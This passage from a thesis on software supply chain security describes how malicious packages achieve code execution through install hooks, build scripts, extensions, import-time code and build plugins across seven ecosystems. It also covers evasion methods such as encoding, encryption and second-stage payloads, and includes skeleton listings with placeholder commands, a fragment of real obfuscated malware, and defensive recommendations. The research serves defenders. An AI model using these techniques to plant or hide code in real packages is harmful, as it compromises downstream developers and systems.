_Remove un-used dependencies_ is frequently used by developers, which contrasts with the observations of Soto-Valerio et al. [157], who found that many Java projects had bloated (un-used) dependencies. Other countermeasures that appear to be widely used among the respondents are _Version pinning_ and _Open-source vulnerability scanners_ , the latter of which does not only address attacks, but also the use of dependencies with known vulnerabilities. 

82 

_5.5. Conclusion_ 

Concerning the attack vector _Create Name Confusion_ , where 70% of the developers claimed to be aware of the problem, we can observe that corresponding safeguards _Typo guard/Typo detection_ and _Preventive squatting the released package_ are only used by a minority of respondents. 

It is also noteworthy to mention that developers’ cost ratings generally coincide with those of the domain expert. Surprising exceptions are _Application Security Testing_ and _Enstablish vetting process for Open-Source components hosted in internal/public repositories_ , both having a median of 3 from developers, compared to a median of 5 from experts. 

## **Response to RQ2.3** 

134 software developers provided feedback on the use of safeguards. The three most-used ones are _Remove un-used dependencies_ , _Version pinning_ and _Integrate Open-Source vulnerability scanner into CI/CD pipeline_ 

## **5.5 Conclusion** 

In this section of the thesis, we have presented and correlated the corresponding safeguards, which are designed to either partially or fully mitigate the attack vectors identified in Chapter 4. The compilation of safeguards and their alignment with attack tree nodes plays a pivotal role in assessing the susceptibility of various stakeholders to supply chain attacks. This assessment, considering both effectiveness and associated costs, offers valuable insights for optimizing the allocation of security budgets. 

Due to the substantial size of the taxonomy, the extensive list of attack vectors, safeguards, and the associated information, such as scientific references and attack reports, we are now well-equipped to introduce the open-source tool that we have developed named _Risk Explorer for Software Supply Chains_ (see Chapter 9, Section 9.1). This tool enables users to interactively explore this wealth of information and serves multiple purposes, including threat modeling and gap analysis. 

While the taxonomy outlined in Chapter 4 offers a comprehensive description of how attackers inject malicious code into third-party dependencies, it does not delve into the technical intricacies of how these third-party components can subsequently execute the malicious code downstream. Therefore, in the following chapter, our objective is to provide an in-depth explanation of this crucial aspect. 

83 

Chapter 6 

# **- CONTRIBUTION 3 UNDERSTANDING HOW THIRD-PARTY DEPENDENCIES ACHIEVE EXECUTION ON DOWNSTREAM SYSTEMS** 

## **Summary** 

**Problem Addressed:** P3 - Lack of Comprehensive Description of Third-Party Dependencies’ Execution Techniques 

**Key Contribution(s):** Descriptions of 3 install-time and 4 runtime techniques, utilized by thirdparty dependencies across 7 ecosystems, to achieve ACE. Additionally, we present various techniques employed to evade detection. 

**Contribution Type:** Understanding 

**Point of view:** Attacker 

**Associated Publication(s):** See reference [4] 

**Scope:** 

**==> picture [212 x 100] intentionally omitted <==**

**----- Start of picture text -----**<br>
ATTACKER<br>1. Make the  2. Make the victim  3. Make the victim<br>malicious OSS  download the  execute the<br>package available malicious OSS  malicious code in<br>package the OSS package<br>DEFENDER<br>Detect malicious package<br>before download or<br>execution<br>**----- End of picture text -----**<br>


In this section, we delve into the crucial stage of the software supply chain attack life cycle, specifically focusing on the execution of malicious code by downstream users, referred to as ACE. As previously outlined in Chapter 1 and the taxonomy of attacks presented in the first contribution of this thesis (Chapter 4), software modularization and the utilization of OSS are fundamental practices in modern software development. OSS 

85 

Chapter 6 – _Contribution 3 - Understanding How Third-Party Dependencies Achieve Execution on Downstream Systems_ 

modules, readily available in package repositories, serve as building blocks for developers, fostering productivity and reusability. 

While these practices offer significant advantages, they also present an attractive surface for attackers. Package repositories, acting as centralized hubs, simplify the discovery, download, installation, and management of OSS modules for developers. However, these processes can entail risks that often remain concealed to users, making package repositories a lucrative target for attackers to distribute malware at scale, as discussed in Chapter 4. 

To successfully execute an OSS supply chain attack, an attacker must satisfy three key prerequisites [29]: 

1. Making a malicious package accessible to downstream users; 

2. Ensuring that downstream users actively engage with the malicious package (e.g., by installing it); 

3. Ensuring that downstream users ultimately execute the malicious code embedded within the package. 

While the taxonomy of attacks detailed in the first thesis contribution comprehensively addresses the first two steps, this section concentrates on the last requirement: ensuring downstream users execute the malicious code. Our investigation encompasses techniques to achieve ACE through the distribution of malicious packages to downstream users, as well as an exploration of evasion strategies employed by attackers to circumvent detection measures. In particular, we set out to answer the following research questions. 

**RQ3.1** – How can 3rd-party dependencies, distributed via package managers, achieve ACE on downstream projects during the third-party package life-cycle phases (i.e., install, runtime)? 

**RQ3.2** – What are the strategies adopted by attackers to evade the detection of malicious code? 

To answer these questions, we first explore the functionalities of package managers for popular languages that allow to trigger execution at install-time and runtime. Then, we identify where attackers can hide malicious code to increase the chances of achieving its execution when the downstream project is built, tested, or run. Based on the analysis of 7 ecosystems, we identify 3 install-time techniques and 4 runtime techniques. Finally, we describe the various techniques employed by attackers to evade detection. 

For the identified techniques, we provide practical guidance to downstream users on how to prevent ACE and to security analysts on how to analyze malicious packages. 

86 

_6.1. Methodology_ 

In addition, we release the source code of example implementations[1] available for the covered programming languages and their reference package manager, i.e., Python (pip), JavaScript (npm), Ruby (gem), PHP (composer), Rust (cargo), Go (go), and Java (mvn). This release aims to support fellow researchers in devising protective measures against such threats. We believe this may also help penetration testers to test whether the offensive techniques explored in this section of the thesis may be achieved within their organizations. 

In the following, we utilize the terminology Tactics, Techniques, and Procedure(s) (TTPs) as defined by the MITRE ATT&CK framework [56]. In our context, tactics refer to the main objectives of an attack, which in our work entails achieving ACE during installation time and runtime. Techniques encompass the specific methods employed by attackers, while procedures outline the practical implementation details followed by attackers. 

## **6.1 Methodology** 

To address both **RQ3.1** and **RQ3.2** , we adopt the approach in Figure 7.1 and we rely on two primary data sources. 

The first is the BKC [60], a dataset containing malicious packages from past attacks. This dataset spans various programming languages, i.e., JavaScript (npm), Python (pip), PHP (composer), Ruby (gem), and Java (mvn). We conduct a comprehensive manual analysis of these packages. 

The second source is the Risk Explorer (cf. Section 9.1), which offers a comprehensive taxonomy and an extensive dataset of references related to OSS supply chain attacks. In this instance, we analyze grey literature materials to extract technical details from previous attacks, identifying any novel or advanced techniques that may not be present in the BKC. 

To address **RQ3.1** , we first study the known attacks and malicious packages in [2] and [60] to identify the underlying root causes to achieve ACE. This involved examining the features provided by the language or the package managers that were exploited to achieve ACE by means of 3rd-party dependencies. To evaluate the presence and similarity of functionalities across diverse programming languages, we conduct a _comparative analysis of package managers’ functionalities_ . This examination involves scrutinizing the documentation of package managers associated with the selected programming languages 

> 1. `https://github.com/SAP-samples/risk-explorer-execution-pocs` 

87 

Chapter 6 – _Contribution 3 - Understanding How Third-Party Dependencies Achieve Execution on Downstream Systems_ 

**==> picture [456 x 154] intentionally omitted <==**

**----- Start of picture text -----**<br>
RQ3.1<br>ACE from  RQ3.2<br>third-party  Evasion<br>dependencies Techniques<br>Study of malicious  Comparative<br>packages analysis of package<br>managers<br>Study of malicious  Analysis of known<br>Analysis of known  packages attacks<br>attacks<br>**----- End of picture text -----**<br>


– Figure 6.1 Approach followed to answer the research questions. 

to determine if similar functionalities exist and if they pose similar risks. In expanding this comparative analysis beyond the languages covered in [2] and [60], we include Go (go), chosen for its explicit focus on addressing supply chain attacks [184], and Rust (cargo), due to its increasing popularity [185], [186]. Upon identifying functionalities that could potentially lead to ACE, we proceed to develop a set of runnable implementations. These implementations provide minimal examples of each specific exploitation technique, showcasing the root cause of the issues and the different code locations susceptible to housing malicious content. 

To address **RQ3.2** , we build upon the evasion techniques identified in [60] and supplement them with evasion strategies documented in the grey literature references from [2]. In this pursuit, we also refer to the literature on code obfuscation [187]–[190] to identify additional evasion techniques that share similarities with those already exploited but have not been observed in the wild (to the best of our knowledge). We adopt the categorization of evasion techniques proposed by Schrittwieser et al. [187], which includes _data obfuscation_ , _static code transformation_ , and _dynamic code transformation_ . 

Our work presents an extensive overview of both observed and potential ACE mechanisms and evasion tactics. This information can help defenders in recognizing malicious packages and devising mitigation strategies within the software supply chain. However, we do not claim to be exhaustive, as there could be other (unknown) techniques for triggering the execution of malicious code and evading detection. 

88 

_6.2. Arbitrary Code Execution Strategies_ 

## **6.2 Arbitrary Code Execution Strategies** 

In this section we answer **RQ3.1** , describing techniques that 3rd-party dependencies may employ to attain ACE when they are installed or run in the context of downstream projects. Building on Ohm et al.’s analysis [27], these techniques are enhanced through insights from grey literature and package manager documentation. 

Table 6.1 provides a summary of the 7 techniques we have identified for achieving ACE. Table 6.2 maps these techniques to the selected languages/package managers and indicates whether each technique is applicable in a particular ecosystem. We provide example implementations for all these techniques. 

## **(I) Install-Time Execution** 

We identify 3 techniques to achieve ACE when downstream users/projects install a 3rd-party dependency using popular package managers (i.e., npm, composer, pip, and gem). 

## **(I1) Run command/scripts leveraging install-hooks [27]** 

This technique involves the execution of code by hooking the install process of 3rdparty dependencies in different stages, using specific keywords that package managers may provide. 

_JavaScript (npm)._ In Node.js, the _package.json_ file contains both metadata information (e.g., name, version) and the list of dependencies related to a project [191]. It also provides installation hooks through the _scripts_ property: keys for different lifecycle phases (e.g., _pre-install_ ) can be used to trigger the execution of the scripts provided as values [191]. The _package.json_ file is processed by the package manager to install and resolve the dependencies for a specific package. During the installation process, scripts are executed according to their definition in the corresponding property to perform additional actions (e.g., to compile code) [50]. 

**Procedure.** To achieve ACE when installing a package through `npm install` , the package has to leverage the installation hooks, namely: _pre-install_ , _install_ , _post-install_ , _preprepare_ , _prepare_ , _postprepare_ , and _prepublish_ (deprecated). An example is shown in Listing 6.1. At this stage, attackers have the possibility to directly execute malicious shell commands, or to invoke external scripts which must be included within the package. 

89 

Chapter 6 – _Contribution 3 - Understanding How Third-Party Dependencies Achieve Execution on Downstream Systems_ 

## **How to achieve Arbitrary Code Execution** 

|**Package Life-Cycle Phase**<br>(**I**) Install-time<br>(**R**) Runtime|**Technique**<br>(**I1**) Run command/scripts<br>leveraging install-hooks [27]<br>(**I2**)<br>Run<br>code<br>in<br>build<br>script [27]<br>(**I3**) Run code in build ex-<br>tension(s)<br>(**R1**) Insert code in method-<br>s/scripts executed when im-<br>porting a module [27]<br>(**R2**)<br>Insert<br>code<br>in<br>commonly-used<br>meth-<br>ods<br>(**R3**) Insert code in con-<br>structor methods (of popu-<br>lar classes)<br>(**R4**) Run code of 3rd-party<br>dependency as build plugin|**Example**|
|---|---|---|
|||In JavaScript (npm), insert<br>a shell command as value<br>of<br>the<br>key<br>`pre-install`<br>in _package.json_<br>(cf. List-<br>ing 6.1).<br>In Python, insert code in<br>_setup.py_ (cf. Listing 6.2).<br>In Ruby (gem), insert code<br>in build extension, such as<br>the _extconf.rb_ fle (cf. List-<br>ing 6.5).<br>In Python, insert code in<br>___init__.py_ fle (cf. Sec-<br>tion 6.2).<br>In<br>Python,<br>insert<br>code<br>in<br>`setup()`<br>method<br>of<br>`distutil.core`.<br>In Python, insert code in<br>`Dataframe()`<br>construc-<br>tor<br>method<br>of<br>package<br>typosquatting<br>`pandas`<br>package.<br>In Java (mvn), insert code<br>in maven plugin that is exe-<br>cuted when building down-<br>stream project.|



– Table 6.1 Techniques that a 3rd-party dependency may use to achieve ACE on downstream during its lifecycle. 

90 

_6.2. Arbitrary Code Execution Strategies_ 

|**Ecosystem**<br>JavaScript (npm)<br>Python (pip)<br>PHP (composer)<br>Ruby (gem)<br>Rust (cargo)<br>Go (go)<br>Java (mvn)|**ACE Technique(s)**<br>**Install-time**<br>**Runtime**<br>**I1**<br>**I2**<br>**I3**<br>**R1**<br>**R2**<br>**R3**<br>**R4**|**ACE Technique(s)**<br>**Install-time**<br>**Runtime**<br>**I1**<br>**I2**<br>**I3**<br>**R1**<br>**R2**<br>**R3**<br>**R4**|
|---|---|---|
||||



Table 6.2 – Comparative analysis about applicability of available techniques per each language (and related package manager). Empty cells in the table indicate that a particular technique is not applicable to a specific language. We provide implementations for all techniques for each programming language. 

– Listing 6.1 (I1) Example implementation for JavaScript using installation hooks in package.json 

1 `{` 2 `"name ": "example",` 3 `"version ": "1.0.0" ,` 4 `... continues ...` 5 `"scripts ": {` 6 **`"pre-install": "** COMMANDS **"`** 

7 `}` 8 `}` 

**Recommendation(s).** The `npm install` command provides the `--ignore-scripts` option, to avoid the execution of any script during installation [192]. If this solution is not viable, it is important to carefully review the content of the installation scripts. This review should be performed for all dependencies being installed, both direct and transitive. However, considering the large number of dependencies that can be required for a single npm package, automation is necessary. Currently, there are no ready-made solutions to address this problem, but academia has started proposing solutions [50], [51] to mitigate install-time attacks for JavaScript (npm). Still, works discussing malicious packages in npm [29], [50], [51], [72] primarily discuss _pre-install_ , _install_ , and _post-install_ hooks, rather than extensively exploring the abovementioned hooks. 

_PHP (composer)._ In PHP, the popular package manager is _Composer_ , which supports 

91 

Chapter 6 – _Contribution 3 - Understanding How Third-Party Dependencies Achieve Execution on Downstream Systems_ 

two types of package distributions: _dist_ and _source_ packages. Dist packages are pre-built packages distributed in a binary format. When installing a dist package, Composer skips the build process and directly uses the pre-built package. By default, dist packages are consumed over source packages. Source packages contain the source code of a package and must be built by the client. The _composer.json_ file (equivalent to _package.json_ for npm packages) contains the build instructions and offers installation hooks, using the _scripts_ property, to execute additional commands within the installation process. 

**Procedure.** To achieve ACE when installing a package using the `composer install` command, the following installation hooks can be defined in the `script` property of the _composer.json_ file [193]: _pre-install-cmd_ , _post-install-cmd_ , _pre-autoload-dump_ , and _postautoload-dump_ . The implementation is similar to the case of JavaScript (cf. Listing 6.1). If the package does not include the _composer.lock_ file, which records the exact versions of the installed dependencies, the additional installation hooks _pre-update-cmd_ and _postupdate-cmd_ will be executed during the installation (otherwise, they are executed only when `composer update` is run). As for npm packages, attackers may directly insert shell commands in _composer.json_ , or invoke external scripts which must be included in the package. 

**Recommendation(s).** Unlike `npm install` , the `composer install` command does not have an option to skip the execution of any script [194]. As mentioned earlier, the hooks _pre-update-cmd_ and _post-update-cmd_ are skipped if _composer.lock_ exists. The _preautoload-dump_ and _post-autoload-dump_ scripts can also be skipped by using the _--noautoloader_ option. However, there is no built-in way to skip _pre-install-cmd_ and _postinstall-cmd_ when using `composer install` . Therefore, it is necessary to examine the content of such installation hooks to ensure they do not execute any malicious code. Moreover, it would be important to evaluate the extension to Composer of approaches like [50], [51]. Recall that the aforementioned procedure only applies to source packages. Thus, it is crucial to prioritize dist packages for all required dependencies (both direct and transitive) and promote their availability. 

## **(I2) Insert code in build script [27]** 

This technique involves the execution of code contained in scripts used by package managers during the installation of 3rd-party dependencies distributed as source code (as they need to be built before usage). 

_Python (pip)._ Python packages may be distributed as source or binary distributions. 

92 

_6.2. Arbitrary Code Execution Strategies_ 

Source distributions ( _sdists_ ) include an installation script, the _setup.py_ file, to define the metadata (e.g., name, version), configurations for building and packaging, and additional actions that may be required. The _pip_ package manager uses _setup.py_ as a source of information to install and manage Python _sdists_ packages. When running `pip install` , the _pip_ tool executes the _setup.py_ file of the package being installed. 

**Procedures.** To achieve ACE when installing a package through `pip install` , an attacker can directly add malicious Python commands to the _setup.py_ file. An example is shown in Listing 6.2 (malicious instruction in line 4). 

– Listing 6.2 (I2) Example implementation for Python sdist packages through code in setup.py 

- 1 `from setuptools import setup` 

- 2 

- 3 `# Any Python code will be executed , for example:` 

- 4 **`import os; os.system("..COMMANDS..")`** 

- 5 `setup(name=’foo ’,version =’1.0’, ...)` 

Another way to achieve ACE when installing a package through `pip install` is to leverage the `cmdclass` property that allows the customization of the tasks performed. Commonly used cmdclass commands available in setuptools include `install` and `build` . Listing 6.3 demonstrates how to customize the install command class to obtain ACE at installation time. First, it is necessary to import the `install` method from the `setuptools.command` module (cf. line 2). Then, a subclass of `install` ( `ExampleClass` , line 4) is created inside the _setup.py_ file, that must implement the `run` method (line 6), which is executed by default at package installation. Malicious code inside the `run` method is thus executed. 

– Listing 6.3 (I2) Example implementation for Python sdist packages through cmdclass commands in setup.py 

- 1 `from distutils.core import setup` 2 **`from setuptools.command.install import install`** `# Required import` 

- 3 

- 4 `class ExampleClass(install):` 

- 5 `def` **`run(self)`** `:` 

- 6 `install.run(self)` 

- 7 `# Any Python code will be executed , for example:` 

- 8 **`import os; os.system("**COMMANDS**")`** 

- 9 

- 10 `setup(name=’foo ’, ...,` **`cmdclass=’install’: ExampleClass`** `)` 

93 

Chapter 6 – _Contribution 3 - Understanding How Third-Party Dependencies Achieve Execution on Downstream Systems_ 

**Recommendation(s).** Achieving ACE primarily depends on consuming source distributions of Python packages for which the installation script is executed during `pip install` . On the contrary, pre-built packages (i.e., _bdists_ ) do not include installation scripts, nor execute code during the installation process. The challenge with bdists is that they need to be produced for each target architecture, i.e., a different version of the same Python package has to be built and published for each target architecture possibly willing to install it. Whenever bdists are available, they are the default choice of package managers. Therefore, when selecting a package to install, packages with bdist distributions should be prioritized. The same logic must be applied to all the direct and transitive dependencies as they are transparently installed together with the selected package. `pip` allows to ignore sdist dependencies via the option `--only-binary :all:` [195]. Yet, packages without binary distributions will fail to install, possibly preventing the successful outcome of the installation process. If sdists are required (either directly or indirectly), it is crucial to verify whether they include a _setup.py_ file and ensure that it does not contain any malicious code. 

_Rust (cargo)._ In Rust, the _Cargo.toml_ file is used to specify package metadata as well as its direct dependencies. Cargo (i.e., package manager for Rust) uses such a file when running `cargo install` . To install a package, cargo also builds the package itself as well as all its direct and transitive dependencies. In addition, cargo provides the flexibility to include build scripts within a package that are compiled and executed just before the package is built [196]. By default, the cargo build system will search for a `build.rs` script in the root directory of the project. This behavior can be overridden by specifying a different path to the build script in the `build` field of the `Cargo.toml` configuration file. Such a feature allows to perform tasks such as building 3rd-party non-Rust code. 

**Procedure.** To achieve ACE when installing a package through `cargo install` , the attacker can include a malicious build script in a package (i.e., a crate) they distribute, that will eventually be executed by the cargo build system. Listing 6.4 shows how to trigger the execution of the commands in line 5 using the _build.rs_ script. 

– Listing 6.4 (I2) Example implementation for Rust leveraging _build.rs_ 

1 `use std:: process :: Command;` 

2 

3 `fn main () {` 

4 `# Any arbitrary Rust code can be executed , for example:` 5 **`let output = Command::new("sh").arg("-c").arg("**COMMANDS**").output();`** 6 `}` 

94 

_6.2. Arbitrary Code Execution Strategies_ 

**Recommendation(s).** To ensure the security of consumed 3rd-party dependencies, it is recommended to check for the presence of build scripts, i.e., _build.rs_ or the one specified within the `build` field in the _Cargo.toml_ file. This applies to both direct and transitive dependencies. Reviewing the content of these scripts is crucial to identify and mitigate potential malicious code. 

## **(I3) Run code in build extension(s)** 

This technique involves executing extensions of 3rd-party dependencies that are necessary for their build process. 

_Ruby (gem)._ The _.gemspec_ file contains the metadata and dependencies for a Ruby package (i.e., a gem). Such a file is used by the RubyGems package manager to install, build, and distribute a package. Gems may include extensions that are built and executed at installation time (i.e., when running `gem install` ) [197]. Note that extensions are also executed when manually building a 3rd-party dependency through the `gem build` command. 

**Procedure.** To achieve ACE when installing a package through `gem install` , two files needs to be manipulated: the _.gemspec_ and extension files. As shown in Listing 6.5, an attacker may define a build extension in _.gemspec_ (line 5 in Listing 6.5a) and include it in the gem. Malicious code in the extension file will be executed (line 4 in Listing 6.5b). 

– Listing 6.5 (I3) Example implementation for Ruby gems leveraging build extensions 

1 `Gem:: Specification.new do |s|` 2 `s.name = "example"` 3 `s.version = "1.0.0"` 4 `... continues ...` 5 **`s.extensions = ["extconf.rb"]`** 6 `end` 

- (a) Content of the _.gemspec_ file for the project 

1 `require "mkmf"` 2 3 `# Any arbitrary Ruby code will be executed , e.g.:` 4 **`exec("**COMMANDS**")`** 

5 6 `# Needed to finish the extension without errors` 7 `create_makefile ("")` 

(b) Content of _extconf.rb_ file 

95 

Chapter 6 – _Contribution 3 - Understanding How Third-Party Dependencies Achieve Execution on Downstream Systems_ 

**Recommendation(s).** The `gem install` command do not provide an option to ignore extensions. In order to prevent such a scenario, gems should be checked to verify if they declare extensions in _.gemspec_ . If present, extensions should be analyzed to verify that they do not contain malicious code. Such a review has to be performed both for direct and transitive dependencies. 

## **(R) Runtime Execution** 

Malicious code can be executed at runtime through various techniques. We identify four scenarios (cf. Table 6.1) where this is more likely to occur: compromising the code executed during the import of external modules, manipulating popular methods, manipulating constructor methods, or leveraging build plugins. 

## **(R1) Insert code in methods/scripts executed when importing a module [27]** 

Certain programming languages execute code when an import statement is processed, even before the code from the imported module is actually used (for Javascript, Python, and Ruby even if the imported module is never used). Thus, runtime execution of 3rdparty code may occur when developers import an external module. Below, we examine the procedures for programming languages susceptible to this technique. 

_JavaScript (npm)._ In Node.js, the `main` attribute [198] in the _package.json_ file determines the entry point script (e.g., `index.js` ) for a package when it is imported into an application (e.g., using `require` ). Attackers can inject malicious code into the entry point script such that it will be executed at runtime when the 3rd-party module is imported, thus achieving ACE. 

_Python (pip)._ Regular packages in Python are typically implemented as a directory containing an `__init__.py` file [199]. Attackers may insert malicious code inside these files since their execution is triggered implicitly when packages are imported using the `import` statement. 

_Ruby (gem)._ Ruby automatically executes code at runtime upon a `require_relative` , `require` or `load` statement. Thus, attackers may insert malicious code within the `.rb` file from which the module is imported. 

_Go (go)._ There are several precautions taken by Go against software supply chain attacks [184]. It does not run any code on installation and there are no installation hooks, preventing the techniques of Section 6.2. Moreover, unlike other programming languages 

96 

_6.2. Arbitrary Code Execution Strategies_ 

analyzed in this thesis, Go lacks a centralized package repository. Instead, packages are directly downloaded from their source code repositories. In Go, dependencies can execute code upon import in two ways: _(i)_ by defining an `init()` method [200], [201], and _(ii)_ by initializing a variable with an anonymous function [201]. This allows the code of a 3rd-party dependency to be executed with higher order of precedence, before the code of the importing application. Additionally, Go automatically removes unused dependencies by default, but prefixing the import with an underscore symbol (e.g., `_ "foo"` ), retains even unused dependencies. Attackers can exploit these techniques to craft a malicious dependency that achieves ACE at runtime during its import [202]. 

## **(R2) Insert code in commonly-used methods** 

Attackers may target popular methods within 3rd-party dependencies that they distribute to downstream users. These methods are attractive because they are commonly used, increasing the likelihood that downstream users will invoke and rely on them. For example, this technique is used in the Java malicious package `com.github.codingandcoding: servlet-api-3.2.0` [60], [203], where the malicious code is contained in the `doGet()` method of the `HttpServlet` class. 

## **(R3) Insert code in constructor methods (of popular classes)** 

Attackers may target constructor methods as suitable places to insert malicious code. In fact, constructors are called during object instantiation, making them potential entry points for malicious activities. For instance, in a typosquatted version of the Python `pandas` package [1], [27], malicious code could be included in the constructor methods of the widely-used class `Dataframe()` . 

Regarding Java, it is also noteworthy to mention that attackers may not only include malicious code in constructor methods but also in instance and static initializers [204]. Instance initializers are executed every time a class instance is created [205]. Static initializers are automatically executed (just once) when a class is initialized, i.e., when a class instance is created, a static method of the class is called, or a static field of the class is assigned or used (excluding constants) [205]. 

97 

Chapter 6 – _Contribution 3 - Understanding How Third-Party Dependencies Achieve Execution on Downstream Systems_ 

## **(R4) Run code of 3rd-party dependency as build plugin** 

This technique consists of running a 3rd-party dependency as a plugin within the build of a downstream project. 

_Java (mvn)._ In Maven, plugins enable developers to define tasks to be performed. Plugins are defined in the Maven configuration file of the project (i.e., _pom.xml_ ) and they can be bound to phases of the build process (e.g., compile, test, package), thus customizing and extending its functionality. Attackers can inject malicious code into Maven plugins as a means to achieve ACE during the build process or to infect the built artifact to spread malicious code. For example, this technique is exploited by the malicious Java package `com.github.codingandcoding:maven-compiler-plugin-3.9.0` [203]. 

**Remarks.** When using 3rd-party dependencies in the tests of a project, the same techniques described in Section 6.2 to achieve ACE apply. Additionally, attackers may ship packages with malicious code in the test routines [27]. This is out of scope in our work, since we focus on the execution of malicious code contained in 3rd-party dependencies during the installation, build, test, or runtime of downstream projects. As a result, malicious code in tests of 3rd-party dependencies is not executed as those tests are not executed in any stage of the lifecycle of the downstream project. 

From the attacker’s viewpoint, install-time techniques provide greater advantages than runtime techniques. In the former, victims simply need to install the package to initiate the malicious code execution, which might explain the prevalence of malicious packages executing code at install-time [27], [32]. Conversely, with runtime techniques, victims not only have to install the third-party dependency but also actively trigger the carrier of the malicious code (e.g., invoking the constructor as demonstrated in the R2 technique). 

## **6.3 Evasion Techniques** 

In this section, we present various techniques that aim to make the detection of malicious source code more challenging. We classify these techniques into the three categories — of software obfuscation namely, _data obfuscation_ , _static code transformation_ , and _dy-_ — _namic code transformation_ as proposed by Schrittwieser et al. [187]. 

The covered techniques include both those that have been observed in real-world attacks (e.g., in BKC [60]) and those that are theoretically viable based on state-of-theart techniques in code obfuscation [187]–[190]. Such techniques can also be combined and 

98 

_6.3. Evasion Techniques_ 

used in conjunction to further challenge the detection and analysis of malicious code. 

While we strive for comprehensiveness, it is important to note that this list is not exhaustive and may evolve over time as new techniques emerge. 

## **Data Obfuscation** 

Malicious code often incorporates hard-coded strings that serve various purposes for attackers. These strings can include, e.g., URLs or IP addresses that point to attackercontrolled servers, shell commands, or paths to sensitive files [6], [206]. Since the analysis of these strings can provide insights into the attacker’s infrastructure, techniques, and intended actions, attackers often employ obfuscation techniques to evade detection and conceal information that could lead to their identity. Thus, in this category, we encompass techniques that alter the way static data (i.e., strings) is stored within source code to conceal it from analysis and enhance its complexity [187], [190]. 

_Encoding._ One commonly used technique involves encoding strings in non-humanreadable formats (e.g., base64, hex) and decoding them at runtime [27]. From an attacker’s perspective, this technique is easy to implement and can effectively evade detection through simple string scanning techniques that look for sensitive words (e.g., `bash` ). However, strings encoded in common formats are relatively easy to de-obfuscate. 

_Compression._ Attackers can employ compression algorithms (e.g., _gzip_ ) to obfuscate strings [27]. The compressed strings would then be decompressed at runtime to retrieve their original content. 

_Encryption._ Attackers may encrypt strings using common algorithms (e.g., AES) and decrypt them at runtime [27]. This approach increases the complexity of the analysis process, as the encrypted strings are not directly readable and require the decryption key to reveal their original content. The key used for decryption can be handled in different ways. In some cases, it may be stored locally within the package itself, making it relatively easy for security analysts to extract and decrypt the strings. To mitigate this risk, attackers may choose to retrieve the decryption key from a remote server at runtime. This approach adds an additional layer of complexity, as the decryption key is not readily available in the package. By relying on a remote server, attackers can dynamically control the availability and distribution of the decryption key, making it more challenging for security analysts to access and decrypt the strings. 

_Binary Arrays._ A more advanced technique is to represent strings in a binary form and store them in binary arrays. Binary arrays provide a convenient way to store and 

99 

Chapter 6 – _Contribution 3 - Understanding How Third-Party Dependencies Achieve Execution on Downstream Systems_ 

manipulate binary data in a programmatic way. By leveraging binary arrays, attackers can perform operations such as bitwise operations, XOR operations, or custom encoding schemes to further obfuscate the strings [207]. To effectively detect and analyze such procedures, security practitioners need to employ advanced techniques capable of handling binary data and apply reverse engineering methods. 

_Reordering of Data._ Another simple and effective technique is to split data into multiple pieces and re-aggregate them at runtime [187], [190]. Attackers can manipulate strings, such as URLs or shell commands, by splitting them into multiple chunks (e.g., assigned to multiple variables) and then concatenating them before providing them to the respective APIs or functions [27]. By breaking down the strings into smaller fragments and reassembling them dynamically, attackers can evade straightforward pattern matching techniques [187] that rely on static scanning of strings for detection. Security analysts need to employ more advanced detection that can handle dynamic string manipulation to effectively mitigate such attacks. 

## **Source Code Transformations** 

To make it challenging for security analysts to understand the purpose and inner workings of malware, attackers employ various techniques to obfuscate the source code. The obfuscation process aims to create a complex and convoluted code structure that hinders reverse engineering and analysis. 

## **Static Code Transformations** 

In this category, we cover techniques involving the transformation of source code that do not necessitate additional runtime modifications for execution [187]. 

_Renaming Identifiers._ To decrease the readability of code, attackers may employ the technique of renaming identifiers such as variable and function names [207]. By changing the names of these identifiers to arbitrary or nonsensical values, attackers make it challenging for analysts to understand the purpose and functionality of the code. An example of such a technique is shown in Listing 6.6. 

– Listing 6.6 Obfuscated code in the _setup.py_ of the package _maratlib-0.2_ [60] 

1 `import sys` 

**==> picture [260 x 10] intentionally omitted <==**

> 3 `l1l1l_cringe_ = 2048` 

100 

_6.3. Evasion Techniques_ 

4 `l11_cringe_ = 7` 5 `def l111_cringe_ (l1ll_cringe_):` 6 `global l11l1_cringe_` 7 `l11l_cringe_ = ord (l1ll_cringe_ [-1])` 8 `ll_cringe_ = l1ll_cringe_ [:-1]` 9 `l1l1_cringe_ = l11l_cringe_ % len (ll_cringe_)` 10 `l1_cringe_ = ll_cringe_ [: l1l1_cringe_] + ll_cringe_ [l1l1_cringe_ :]` 11 `... continues ...` 

_Dead/Useless Code Insertion._ Attackers may insert dead or useless code into their malicious code (e.g., `mplatlib-1.0` [60]) to deceive security analysts during the reverse engineering process and to make the latter more time-consuming [151], [207]. 

Dead code refers to portions of code that are intentionally added but never executed during the runtime of the program. It serves no functional purpose and may contain instructions or logic that are irrelevant to the actual operation of the malware. 

Useless code, on the other hand, refers to code that may be syntactically correct and executable but serves no meaningful purpose in terms of the malware’s functionality. As an example, it may consist of redundant or duplicated code, excessive comments, or superfluous operations. 

_Split Code into Multiple Files._ Attackers may employ the technique of splitting malicious code into multiple files within the same package to obfuscate their activities and make detection and analysis more challenging. By distributing the malicious code across multiple files, it becomes harder for security analysts to identify and understand the complete scope of the malicious functionality. 

Similarly, attackers employ the technique of leveraging second-stage payload(s) [27]. Instead of directly including the malicious code within the package, attackers only provide the initial code for fetching the actual malicious payload from external sources. By utilizing a remote server, attackers gain dynamic control over the availability and distribution of the second-stage payload, which increases the difficulty for security analysts to access the actual malicious code. This approach makes more complex the analysis process, as the initial code alone does not reveal the full extent of the malicious activities. 

_Hide Code into Dependency Tree._ Another obfuscation technique used by attackers is the hiding of malicious code within the dependency tree of software packages. This technique involves including the actual malicious code in either the direct dependencies (e.g., as happened in the case of `event-stream` [26]) or the transitive dependencies (which is more effective) of the final package that will be distributed to downstream users in an 

101 

Chapter 6 – _Contribution 3 - Understanding How Third-Party Dependencies Achieve Execution on Downstream Systems_ 

OSS supply chain attack. Where to place the malicious code within the actual malicious dependency is explored in Section 6.2. 

By embedding the malicious code deep within the dependency tree, attackers attempt to evade detection, as security scanning tools and analysts may have difficulties in thoroughly scanning every single dependency. 

_Split Code into Multiple Dependencies._ Instead of placing all the malicious code in a single package, attackers may distribute it across multiple dependencies within the package ecosystem. This approach aims to make it more difficult to detect and analyze the malicious code since it is scattered across different packages. To the best of our knowledge, this technique has not been observed (yet) in real-world attacks. 

In theory, a comprehensive scan of packages and their relationships within package repositories could potentially uncover such technique. In practice, this is challenging due to the vast number of packages and the continuous influx of new versions and updates. 

